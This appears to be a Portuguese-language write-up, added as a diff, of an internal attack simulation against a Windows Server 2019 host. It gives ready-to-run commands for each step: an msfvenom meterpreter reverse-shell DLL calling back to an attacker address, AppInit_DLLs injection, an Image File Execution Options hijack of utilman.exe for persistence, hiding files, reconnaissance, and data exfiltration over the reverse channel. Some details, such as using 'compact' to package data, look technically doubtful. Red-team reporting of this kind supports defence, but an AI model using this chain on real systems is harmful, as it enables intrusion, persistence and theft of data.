@@ -1,0 +1,35 @@
+Durante uma simulação de ataque interno, foi utilizado um ambiente Windows Server 2019 acessado por um usuário com permissões limitadas. A entrada inicial foi obtida por meio de movimentação lateral através de um compartilhamento de rede com permissões incorretas (Everyone:Full Control) no host srv-financeiro. Nesse compartilhamento, o atacante conseguiu escrever arquivos executáveis, possibilitando a introdução de uma DLL maliciosa.
+
+A DLL foi gerada com o msfvenom, utilizando o comando:
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.15.99 LPORT=443 -f dll -o loginui.dll
+
+Em seguida, o atacante modificou a chave de registro AppInit_DLLs para forçar a injeção da DLL em processos com interface gráfica, usando:
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d loginui.dll /f
+
+A execução da DLL foi feita através do seguinte comando:
+
+rundll32 loginui.dll,EntryPoint
+
+Após a execução, a sessão reversa foi estabelecida com o C2 controlado pelo atacante. Para manter o acesso persistente e escalar privilégios, foi utilizada a técnica de Image File Execution Options Injection, redirecionando a execução do utilman.exe para um executável malicioso com o comando:
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\temp\persist.exe" /f
+
+Dessa forma, ao pressionar as teclas Win+U na tela de login, o payload era executado com privilégios elevados, simulando um bypass de UAC.
+
+Para ocultar a DLL, o atacante aplicou atributos de sistema e oculto no arquivo:
+
+attrib +h +s loginui.dll
+
+Na sequência, foi realizada a descoberta do ambiente usando:
+
+net view /domain
+tasklist /svc
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+
+Esses comandos permitiram identificar softwares de segurança, serviços ativos e potenciais alvos privilegiados. Finalizando o ataque, os dados internos foram compactados com:
+
+compact /c /s:C:\dados /a /i /f /q
+
+E exfiltrados pelo canal já estabelecido via meterpreter, aproveitando a conexão reversa ativa.
